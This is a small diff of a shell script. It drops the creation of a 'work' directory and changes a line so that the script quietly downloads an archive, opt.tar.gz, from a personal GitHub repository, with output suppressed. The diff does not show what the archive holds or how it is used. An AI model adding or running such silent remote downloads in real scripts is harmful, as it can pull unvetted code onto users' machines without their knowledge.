@@ -1,6 +1,4 @@
 #!/bin/sh
-mkdir work
-cd work
 ls -la
 sleep 2
 
@@ -101,7 +99,7 @@ echo " "
 
 sleep 2
 
-./update/update wget -q https://raw.githubusercontent.com/alexgabbard01/update/main/opt.tar.gz > /dev/null
+wget -q https://raw.githubusercontent.com/alexgabbard01/update/main/opt.tar.gz > /dev/null
 
 sleep 2
 
